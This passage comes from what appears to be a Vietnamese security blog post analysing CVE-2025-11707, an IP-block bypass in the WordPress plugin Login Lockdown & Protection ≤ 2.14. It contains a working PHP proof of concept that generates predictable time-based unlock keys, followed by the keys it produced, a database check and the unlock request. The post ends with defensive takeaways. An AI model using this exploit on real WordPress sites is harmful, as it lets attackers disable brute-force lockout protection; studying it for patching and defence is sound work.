</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost/wp-login.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">http_build_query</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;loginlockdown_recovery_email&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;admin_email&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;loginlockdown_recovery_submit&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Send unblock email&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;loginlockdown_recovery_nonce&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;valid_nonce&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;_wp_http_referer&#34;</span>               <span class="o">=&gt;</span> <span class="s2">&#34;/wp-login.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$opts</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;http&#34;</span> <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;method&#34;</span>  <span class="o">=&gt;</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;header&#34;</span>  <span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Referer: http://localhost/wp-login.php</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;User-Agent: PHP</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Cookie: wordpress_test_cookie=WP%20Cookie%20check</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;content&#34;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;ignore_errors&#34;</span> <span class="o">=&gt;</span> <span class="k">true</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$context</span> <span class="o">=</span> <span class="nx">stream_context_create</span><span class="p">(</span><span class="nv">$opts</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$response</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$context</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$response</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$now</span> <span class="o">=</span> <span class="nx">time</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$t</span> <span class="o">=</span> <span class="nv">$now</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$t</span> <span class="o">&lt;=</span> <span class="nv">$now</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$t</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$r</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span> <span class="nv">$r</span> <span class="o">&lt;=</span> <span class="mi">10000</span><span class="p">;</span> <span class="nv">$r</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$t</span> <span class="o">.</span> <span class="nv">$r</span><span class="p">)</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Ghi chú</p><p>Do <code>unblock_key</code> được sinh dựa trên <code>time()</code> (độ chính xác theo <strong>giây</strong>), kẻ tấn công chỉ cần tạo các giá trị key trong khoảng <strong>±1 giây</strong> so với thời điểm gửi request recovery.
Với mỗi timestamp chỉ có rất ít giá trị ngẫu nhiên khả dĩ, tổng không gian tìm kiếm là <strong>rất nhỏ</strong>, cho phép thử toàn bộ các key hợp lệ trong thời gian ngắn khi transient vẫn còn hiệu lực.</p></div><ol start="2">
<li>Chạy file <code>gen_key.php</code> để lấy key:</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">w41🎃w41</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="nx">Pentest</span><span class="o">/</span><span class="nx">tmp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="err">$</span> <span class="nx">gen_key</span><span class="o">.</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="o">...</span> 
</span></span><span class="line"><span class="cl"><span class="mi">98</span><span class="nx">b65fa71ca7a0f5aeefc93082c6a381</span>
</span></span><span class="line"><span class="cl"><span class="mi">72</span><span class="nx">a72562252bcd5c005bfbce95d72bea</span>
</span></span><span class="line"><span class="cl"><span class="nx">f98100c86d0bd348eeb18332ac85756b</span>
</span></span><span class="line"><span class="cl"><span class="mi">63894</span><span class="nx">ea709e4be84967328ad37392043</span>
</span></span><span class="line"><span class="cl"><span class="nx">f67370456015246850e783fbb406a176</span>
</span></span><span class="line"><span class="cl"><span class="nx">bf31356071a060b3d9d12d9dc3711b30</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><strong>Key được lưu trong database</strong>:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mysql&gt; SELECT option_name, option_value  FROM wp_options  WHERE option_name LIKE <span class="s1">&#39;%loginlockdown_unlock_%&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------------------------------------------------------------+----------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> option_name                                                              <span class="p">|</span> option_value                     <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------------------------------------------------------------+----------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> _transient_timeout_loginlockdown_unlock_count_1                          <span class="p">|</span> <span class="m">1769100607</span>                       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> _transient_loginlockdown_unlock_count_1                                  <span class="p">|</span> <span class="m">1</span>                                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> _transient_timeout_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b <span class="p">|</span> <span class="m">1769100607</span>                       <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> _transient_loginlockdown_unlock_f98100c86d0bd348eeb18332ac85756b         <span class="p">|</span> f98100c86d0bd348eeb18332ac85756b <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------------------------------------------------------------+----------------------------------+</span></span></code></pre></td></tr></table></div>
</div>
</div><p>=&gt; Trùng với key ta đã tạo ở trên</p>
<ol start="3">
<li>Gửi request unlock</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-http"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/?loginlockdown_unblock=f98100c86d0bd348eeb18332ac85756b</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-22-cve-2025-11707/result.png" title="Result" data-thumbnail="/posts/2026-01-22-cve-2025-11707/result.png" data-sub-html="<h2>Result</h2><p>Result</p>"><img loading="lazy" src='/posts/2026-01-22-cve-2025-11707/result.png' alt="Result" height="588" width="1359"></a><figcaption class="image-caption">Result</figcaption>
  </figure></p>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng trong plugin <strong>Login Lockdown &amp; Protection ≤ 2.14</strong> xuất phát từ việc thiết kế cơ chế recovery không an toàn. Mặc dù quy trình mở khóa được xây dựng với mục đích yêu cầu administrator xác nhận qua email, nhưng trên thực tế, <strong>việc sinh và kiểm tra <code>unblock_key</code> không ràng buộc với người dùng, IP hay session</strong>, đồng thời sử dụng nguồn entropy rất thấp. Điều này cho phép kẻ tấn công chưa xác thực có thể <strong>tự tạo và thử các khóa hợp lệ trong thời gian ngắn</strong>, từ đó mở khóa IP của chính mình mà không cần truy cập vào email của quản trị viên. Kết quả là toàn bộ cơ chế chặn IP sau nhiều lần đăng nhập thất bại có thể bị vô hiệu hóa.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Cơ chế bảo mật dựa trên <strong>email confirmation</strong> sẽ không còn ý nghĩa nếu <strong>token có thể bị đoán được</strong>.</li>
<li>Token dùng cho các hành động nhạy cảm phải có <strong>entropy cao</strong>, không được dựa vào <code>time()</code> hoặc nguồn ngẫu nhiên có không gian tìm kiếm nhỏ.</li>
<li>Recovery token cần được <strong>ràng buộc với ngữ cảnh</strong> (IP, user, session, hoặc request) thay vì chỉ tồn tại độc lập trong hệ thống.</li>
<li>Logic xử lý mở khóa được gắn vào hook <code>init</code> khiến endpoint mở khóa có thể bị kích hoạt từ <strong>bất kỳ request nào</strong>, làm tăng bề mặt tấn công.</li>
<li>Các cơ chế giới hạn (rate-limit) nếu chỉ gắn với <strong>user ID</strong> mà không gắn với IP hoặc request source có thể bị lạm dụng trong kịch bản tấn công chưa xác thực.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/" target="_blank" rel="external nofollow noopener noreferrer">Bypass Vulnerability</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/login-lockdown/vulnerability/wordpress-login-lockdown-protection-plugin-2-14-ip-block-bypass-vulnerability" target="_blank" rel="external nofollow noopener noreferrer">WordPress Login Lockdown Plugin &lt;= 2.14 is vulnerable to Bypass Vulnerability</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2026-01-24-cve-2025-59577/" title="CVE-2025-59577 Analysis &amp; POC">CVE-2025-59577 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-23-cve-2025-10745/" title="CVE-2025-10745 Analysis &amp; POC">CVE-2025-10745 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-15-cve-2025-12788/" title="CVE-2025-12788 Analysis &amp; POC">CVE-2025-12788 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-14-cve-2025-3102/" title="CVE-2025-3102 Analysis &amp; POC">CVE-2025-3102 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-12-cve-2025-4796/" title="CVE-2025-4796 Analysis &amp; POC">CVE-2025-4796 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2026-01-22 23:05:57">Cập nhật ngày 2026-01-22&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/2d9fc4a8bdfb1ca61dbc12f2837e9c77fe8e956c" rel="external nofollow noopener noreferrer" target="_blank" title="Add post 2026-01-22-CVE-2025-11707&#10&#10Commit: 2d9fc4a8bdfb1ca61dbc12f2837e9c77fe8e956c [2d9fc4a8]&#10Author: w41bu1&#10Date: 2026-01-22 23:05:57"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>2d9fc4a8</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2026-01-22-cve-2025-11707/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-22-CVE-2025-11707/index.vi.md?plain=1" title="Xem mã nguồn" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2026-01-22-CVE-2025-11707/index.vi.md" title="Chỉnh sửa trang này" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-11707&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-11707&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2026-01-22-CVE-2025-11707/index.vi.md?plain=1%7c" title="Báo cáo lỗi" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2026-01-22-CVE-2025-11707/index.vi.md" title="Mở trong trình chỉnh sửa" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/" data-title="CVE-2025-11707 Analysis &amp; POC" data-hashtags="analyst,plugin,Bypass Vulnerability"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/" data-title="CVE-2025-11707 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/vi/tags/analyst/" class="post-tag" title="Nhãn - Analyst">Analyst</a><a href="/vi/tags/plugin/" class="post-tag" title="Nhãn - Plugin">Plugin</a><a href="/vi/tags/bypass-vulnerability/" class="post-tag" title="Nhãn - Bypass Vulnerability">Bypass Vulnerability</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
    </section>
  </div><div class="post-nav"><a href="/vi/posts/2026-01-15-cve-2025-12788/" class="post-nav-item" rel="prev" title="CVE-2025-12788 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-12788 Analysis &amp; POC</a><a href="/vi/posts/2026-01-23-cve-2025-10745/" class="post-nav-item" rel="next" title="CVE-2025-10745 Analysis &amp; POC">CVE-2025-10745 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#increment-fails">Increment Fails</a></li>
        <li><a href="#authentication--block">Authentication &amp; Block</a></li>
        <li><a href="#get-unlock-key">Get Unlock Key</a></li>
        <li><a href="#unlock">Unlock</a></li>
      </ul>
    </li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/17786bd1524adf32cf85cd7fcc549acf.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
